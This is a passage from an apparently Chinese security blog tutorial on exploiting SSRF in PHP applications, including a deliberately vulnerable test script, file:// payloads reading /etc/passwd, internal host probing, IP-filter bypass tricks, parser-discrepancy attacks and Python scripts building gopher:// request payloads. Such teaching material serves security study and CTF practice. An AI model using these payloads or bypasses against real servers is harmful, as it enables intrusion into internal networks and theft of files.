class="hljs-string">&#x27;http://47.xxx.xxx.72:2333/aaa&#x27;</span>));<br><span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span> = unserialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;a();    <span class="hljs-comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>47.xxx.xxx.72</code>监听<code>2333</code>端口，访问<code>ssrf.php</code>，即可在<code>47.xxx.xxx.72</code>上得到访问的数据</p><p>由于它仅限于<code>http/https</code>协议，所以用处不是很大。但是如果这里的<code>http</code>头部还存在<code>crlf</code>漏洞，那么我们就可以进行<code>ssrf+crlf</code>，注入或修改一些<code>http</code>请求头，，详情请看：<a href="https://www.anquanke.com/post/id/202025">《SoapClient+crlf组合拳进行SSRF》</a></p><h3 id="SSRF漏洞利用的相关协议"><a href="#SSRF漏洞利用的相关协议" class="headerlink" title="SSRF漏洞利用的相关协议"></a>SSRF漏洞利用的相关协议</h3><p>SSRF漏洞的利用所涉及的协议有：</p><ul><li>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</li><li>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</li><li>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</li><li>http/s协议：探测内网主机存活</li></ul><h3 id="常见利用方式（file、http-s和dict协议）"><a href="#常见利用方式（file、http-s和dict协议）" class="headerlink" title="常见利用方式（file、http/s和dict协议）"></a>常见利用方式（file、http/s和dict协议）</h3><p>以下几个演示所用的测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP<br><span class="hljs-comment">// ssrf.php</span><br><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br><span class="hljs-variable">$link</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$curlobj</span> = curl_init(); <span class="hljs-comment">// 创建新的 cURL 资源</span><br>curl_setopt(<span class="hljs-variable">$curlobj</span>, CURLOPT_POST, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$curlobj</span>,CURLOPT_URL,<span class="hljs-variable">$link</span>);<br>curl_setopt(<span class="hljs-variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>); <span class="hljs-comment">// 设置 URL 和相应的选项</span><br><span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$curlobj</span>); <span class="hljs-comment">// 抓取 URL 并把它传递给浏览器</span><br>curl_close(<span class="hljs-variable">$curlobj</span>); <span class="hljs-comment">// 关闭 cURL 资源，并且释放系统资源</span><br> <br><span class="hljs-comment">// $filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;</span><br><span class="hljs-comment">// file_put_contents($filename, $result); </span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="读取内网文件（file协议）"><a href="#读取内网文件（file协议）" class="headerlink" title="读取内网文件（file协议）"></a>读取内网文件（file协议）</h4><p>我们构造如下payload，即可将服务器上的本地文件及网站源码读取出来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP<br>ssrf.php?url=file:<span class="hljs-comment">///etc/passwd</span><br>ssrf.php?url=file:<span class="hljs-comment">///var/www/html/flag.php</span><br></code></pre></td></tr></table></figure><h4 id="探测内网主机存活（http-s协议）"><a href="#探测内网主机存活（http-s协议）" class="headerlink" title="探测内网主机存活（http/s协议）"></a>探测内网主机存活（http/s协议）</h4><p>一般是先想办法得到目标主机的网络配置信息，如读取<code>/etc/hosts</code>、<code>/proc/net/arp</code>、<code>/proc/net/fib_trie</code>等文件，从而获得目标主机的内网网段并进行爆破。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">ssrf.php?url=http:<span class="hljs-comment">//192.168.52.1</span><br>ssrf.php?url=http:<span class="hljs-comment">//192.168.52.6</span><br>ssrf.php?url=http:<span class="hljs-comment">//192.168.52.25</span><br>......<br></code></pre></td></tr></table></figure><p>为了方便，我们可以借助<code>burpsuite</code>的<code>Intruder</code>模块进行爆破，</p><h4 id="扫描内网端口（http-s和dict协议）"><a href="#扫描内网端口（http-s和dict协议）" class="headerlink" title="扫描内网端口（http/s和dict协议）"></a>扫描内网端口（http/s和dict协议）</h4><h3 id="相关绕过姿势"><a href="#相关绕过姿势" class="headerlink" title="相关绕过姿势"></a>相关绕过姿势</h3><p>对于SSRF的限制大致有如下几种：</p><ul><li>限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求。</li><li>限制域名只能为<code>http://www.xxx.com/</code></li><li>限制不能访问内网的IP，以防止对内网进行攻击。</li><li>屏蔽返回的详细信息。</li></ul><h4 id="利用HTTP基本身份认证的方式绕过"><a href="#利用HTTP基本身份认证的方式绕过" class="headerlink" title="利用HTTP基本身份认证的方式绕过"></a>利用HTTP基本身份认证的方式绕过</h4><p>如果目标代码限制访问的域名只能为<code>http://www.xxx.com/</code>，那么我们可以采用HTTP基本身份认证的方式绕过。即<code>@</code>：<code>http://www.xxx.com@www.evil.com/</code></p><h4 id="利用302跳转绕过内网IP"><a href="#利用302跳转绕过内网IP" class="headerlink" title="利用302跳转绕过内网IP"></a>利用302跳转绕过内网IP</h4><p>绕过对内网ip的限制我们可以利用302跳转的方法，有以下两种。</p><p>（1）网络上存在一个很神奇的服务，网址为<code>http://xip.io/</code>，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子：</p><p>当我们访问：<code>http://127.0.0.1.xip.io/flag.php</code>时，实际上访问的是<code>http://127.0.0.1/1.php</code> 。像这种网址还有<code>http://nip.io</code> <code>http//sslip.io</code>。</p><p>（2）短地址跳转绕过，这里也给出一个网址<code>https://dwztz.com/</code>：</p><p><img src="/wzimg/80.png" alt="a"></p><h4 id="进制的转换绕过内网IP"><a href="#进制的转换绕过内网IP" class="headerlink" title="进制的转换绕过内网IP"></a>进制的转换绕过内网IP</h4><p>可以使用一些不同的进制替代ip地址，从而绕过WAF，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$ip</span> = explode(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-variable">$ip</span>);<br><span class="hljs-variable">$r</span> = (<span class="hljs-variable">$ip</span>[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">24</span>) | (<span class="hljs-variable">$ip</span>[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">16</span>) | (<span class="hljs-variable">$ip</span>[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">8</span>) | <span class="hljs-variable">$ip</span>[<span class="hljs-number">3</span>] ;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$r</span> &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-variable">$r</span> += <span class="hljs-number">4294967296</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;十进制:&quot;</span>;     <span class="hljs-comment">// 2130706433</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$r</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;八进制:&quot;</span>;     <span class="hljs-comment">// 0177.0.0.1</span><br><span class="hljs-keyword">echo</span> decoct(<span class="hljs-variable">$r</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;十六进制:&quot;</span>;   <span class="hljs-comment">// 0x7f.0.0.1</span><br><span class="hljs-keyword">echo</span> dechex(<span class="hljs-variable">$r</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="其他各种指向127-0-0-1的地址"><a href="#其他各种指向127-0-0-1的地址" class="headerlink" title="其他各种指向127.0.0.1的地址"></a>其他各种指向127.0.0.1的地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">http://localhost/         <span class="hljs-comment"># localhost就是代指127.0.0.1</span><br>http://<span class="hljs-number">0</span>/                 <span class="hljs-comment"># 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1</span><br>http://<span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/       <span class="hljs-comment"># 0.0.0.0这个IP地址表示整个网络，可以代表本机 ipv4 的所有地址</span><br>http://[<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:ffff:<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>]/    <span class="hljs-comment"># 在liunx下可用，window测试了下不行</span><br>http://[::]:<span class="hljs-number">80</span>/           <span class="hljs-comment"># 在liunx下可用，window测试了下不行</span><br>http://<span class="hljs-number">127</span>。<span class="hljs-number">0</span>。<span class="hljs-number">0</span>。<span class="hljs-number">1</span>/       <span class="hljs-comment"># 用中文句号绕过</span><br>http://①②⑦.⓪.⓪.①<br>http://<span class="hljs-number">127.1</span>/<br>http://<span class="hljs-number">127.00000</span><span class="hljs-number">.00000</span><span class="hljs-number">.001</span>/ <span class="hljs-comment"># 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1</span><br></code></pre></td></tr></table></figure><h4 id="利用不存在的协议头绕过指定的协议头"><a href="#利用不存在的协议头绕过指定的协议头" class="headerlink" title="利用不存在的协议头绕过指定的协议头"></a>利用不存在的协议头绕过指定的协议头</h4><p><code>file_get_contents()</code>函数的一个特性，即当PHP的 <code>file_get_contents()</code> 函数在遇到不认识的协议头时候会将这个协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。（include()函数也有类似的特性）</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^https/is&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no hack&quot;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上面的代码限制了url只能是以https开头的路径，那么我们就可以如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">httpsssss:<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>此时<code>file_get_contents()</code> 函数遇到了不认识的伪协议头“httpsssss://”，就会将他当做文件夹，然后再配合目录穿越即可读取文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">CODE<br>ssrf.php?url=httpsssss:<span class="hljs-comment">//../../../../../../etc/passwd</span><br>ssrf.php?url=httpsssss:<span class="hljs-comment">//abc../../../../../../etc/passwd</span><br></code></pre></td></tr></table></figure><p><img src="/wzimg/81.png" alt="image-20210415162950879"></p><h4 id="利用URL的解析问题"><a href="#利用URL的解析问题" class="headerlink" title="利用URL的解析问题"></a>利用URL的解析问题</h4><p><strong>（1）利用readfile和parse_url函数的解析差异绕过指定的端口</strong></p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http://&#x27;</span>. <span class="hljs-variable">$_GET</span>[url];<br><span class="hljs-variable">$parsed</span> = parse_url(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>( <span class="hljs-variable">$parsed</span>[port] == <span class="hljs-number">80</span> )&#123;  <span class="hljs-comment">// 这里限制了我们传过去的url只能是80端口的</span><br>readfile(<span class="hljs-variable">$url</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Hacker!&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>用python在当前目录下起一个端口为11211的WEB服务：</p><p><img src="/wzimg/82.png" alt="image-20210415163949263"></p><p>上述代码限制了我们传过去的url只能是80端口的，但如果我们想去读取11211端口的文件的话，我们可以用以下方法绕过：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">?url=<span class="hljs-number">127.0.0.1</span>:<span class="hljs-number">11211:80</span>/flag.txt<br></code></pre></td></tr></table></figure><p><img src="/wzimg/83.png" alt="image-20210415164003658"></p><p>原理：</p><p><img src="/wzimg/84.png" alt="image-20210415164003658"></p><p>从上图中可以看出readfile()函数获取的端口是最后冒号前面的一部分（11211），而parse_url()函数获取的则是最后冒号后面的的端口（80），利用这种差异的不同，从而绕过WAF。</p><p>这两个函数在解析host的时候也有差异，如下图：</p><p><img src="/wzimg/85.png" alt="image-20210415164003658"></p><p><code>readfile()</code>函数获取的是@号后面一部分<code>（evil.com）</code>，而<code>parse_url()</code>函数获取的则是@号前面的一部分<code>（google.com）</code>，利用这种差异的不同，我们可以绕过题目中<code>parse_url()</code>函数对指定<code>host</code>的限制。</p><p><strong>（2）利用curl和parse_url的解析差异绕指定的host</strong></p><p>原理如下：</p><p><img src="/wzimg/86.png" alt="image-20210415164003658"></p><p>从上图中可以看到curl()函数解析的是第一个@后面的网址，而<code>parse_url()</code>函数解析的是第二个@后面的网址。利用这个原理我们可以绕过题目中<code>parse_url()</code>函数对指定host的限制。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_inner_ip</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$match_result</span>=preg_match(<span class="hljs-string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="hljs-variable">$url</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$match_result</span>)<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">try</span><br>    &#123;<br>        <span class="hljs-variable">$url_parse</span>=parse_url(<span class="hljs-variable">$url</span>);<br>    &#125;<br>    <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-variable">$hostname</span>=<span class="hljs-variable">$url_parse</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>    <span class="hljs-variable">$ip</span>=gethostbyname(<span class="hljs-variable">$hostname</span>);<br>    <span class="hljs-variable">$int_ip</span>=ip2long(<span class="hljs-variable">$ip</span>);<br>    <span class="hljs-keyword">return</span> ip2long(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || ip2long(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || ip2long(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">20</span> || ip2long(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">16</span>;<span class="hljs-comment">// 检查是否是内网ip</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe_request_url</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (check_inner_ip(<span class="hljs-variable">$url</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">&#x27; is inner ip&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-variable">$ch</span> = curl_init();<br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>        <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$result_info</span> = curl_getinfo(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>])<br>        &#123;<br>            safe_request_url(<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>]);<br>        &#125;<br>        curl_close(<span class="hljs-variable">$ch</span>);<br>        var_dump(<span class="hljs-variable">$output</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$url</span>))&#123;<br>    safe_request_url(<span class="hljs-variable">$url</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上述代码中可以看到<code>check_inner_ip</code>函数通过 <code>url_parse()</code>函数检测是否为内网IP，如果不是内网 IP ，则通过 <code>curl()</code> 请求 url 并返回结果，我们可以利用<code>curl</code>和<code>parse_url</code>解析的差异不同来绕过这里的限制，让 <code>parse_url()</code> 处理外部网站网址，最后 <code>curl()</code> 请求内网网址。paylaod如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?url=http:<span class="hljs-comment">//@127.0.0.1:80@www.baidu.com/flag.php</span><br></code></pre></td></tr></table></figure><p>不过这个方法在Curl较新的版本里被修掉了，所以我们还可以使用另一种方法，即 <code>0.0.0.0</code>。<code>0.0.0.0</code> 这个IP地址表示整个网络，可以代表本机 ipv4 的所有地址，使用如下即可绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?url=http:<span class="hljs-comment">//0.0.0.0/flag.php</span><br></code></pre></td></tr></table></figure><p>但是这只适用于Linux系统上，Windows系统的不行。</p><p>[<a href="https://whoamianony.top/2020/11/24/ctf-bi-sai-ji-lu/2020-shou-jie-xiang-yun-bei-wang-luo-an-quan-da-sai-writeup/#toc-heading-5">2020 首届“祥云杯”网络安全大赛]doyouknowssrf</a> </p><h3 id="常见攻击方式（Gopher协议）"><a href="#常见攻击方式（Gopher协议）" class="headerlink" title="常见攻击方式（Gopher协议）"></a>常见攻击方式（Gopher协议）</h3><h4 id="Gopher协议在SSRF中的利用"><a href="#Gopher协议在SSRF中的利用" class="headerlink" title="Gopher协议在SSRF中的利用"></a>Gopher协议在SSRF中的利用</h4><p><strong>（1）Gopher协议格式</strong></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">URL:</span> gopher:<span class="hljs-comment">//&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br><br><span class="hljs-meta"># 注意不要忘记后面那个下划线<span class="hljs-string">&quot;_&quot;</span>，下划线<span class="hljs-string">&quot;_&quot;</span>后面才开始接TCP数据流，如果不加这个<span class="hljs-string">&quot;_&quot;</span>，那么服务端收到的消息将不是完整的，该字符可随意写。</span><br></code></pre></td></tr></table></figure><ul><li>gopher的默认端口是70</li><li>如果发起POST请求，回车换行需要使用<code>%0d%0a</code>来代替<code>%0a</code>，如果多个参数，参数之间的&amp;也需要进行URL编码</li></ul><p>在gopher协议中发送HTTP的数据，需要以下三步：</p><ol><li>抓取或构造HTTP数据包</li><li>URL编码、将回车换行符<code>%0a</code>替换为<code>%0d%0a</code></li><li>发送符合gopher协议格式的请求</li></ol><p><strong>（2）利用Gopher协议发送HTTP GET请求</strong></p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;w0s1np&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>接下来我们构造payload。一个典型的GET型的HTTP包类似如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">HTTP<br>GET /index.php?w0s1np=Bunny HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br></code></pre></td></tr></table></figure><p>然后利用以下脚本进行一步生成符合Gopher协议格式的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>payload =\<br><span class="hljs-string">&quot;&quot;&quot;GET /index.php?whoami=Bunny HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">&quot;&quot;&quot;</span>  <br><span class="hljs-comment"># 注意后面一定要有回车，回车结尾表示http请求结束</span><br>tmp = urllib.parse.quote(payload)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p><img src="/wzimg/87.png" alt="image-20210415173607611"></p><blockquote><p><strong>注意这几个问题：</strong></p><ol><li>问号（?）需要转码为URL编码，也就是%3f</li><li>回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a</li><li>在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</li></ol></blockquote><p>然后执行：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> gopher://<span class="hljs-number">127.0.0.1:80</span>/_GET%<span class="hljs-number">20</span>/index.php%<span class="hljs-number">3</span>Fw<span class="hljs-number">0</span>s<span class="hljs-number">1</span>np%<span class="hljs-number">3</span>Dwoshilnp%<span class="hljs-number">20</span>HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>AHost%<span class="hljs-number">3</span>A%<span class="hljs-number">20127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A<br></code></pre></td></tr></table></figure><p><img src="/wzimg/88.png" alt="image-20210415173735617"></p><p><strong>（3）利用Gopher协议发送HTTP POST请求</strong></p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;w0s1np&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>接下来我们构造payload。一个典型的POST型的HTTP包类似如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">POST /index.php HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: <span class="hljs-number">15</span><br><br>w01np=woshilnp<br></code></pre></td></tr></table></figure><p><strong>注意：上面那四个HTTP头是POST请求必须的，即POST、Host、Content-Type和Content-Length。如果少了会报错的，而GET则不用。并且，特别要注意Content-Length应为字符串“w01np=woshilnp”的长度。</strong></p><p>最后用脚本我们将上面的POST数据包进行URL编码并改为gopher协议</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>payload =\<br><span class="hljs-string">&quot;&quot;&quot;POST /index.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: 15</span><br><span class="hljs-string"></span><br><span 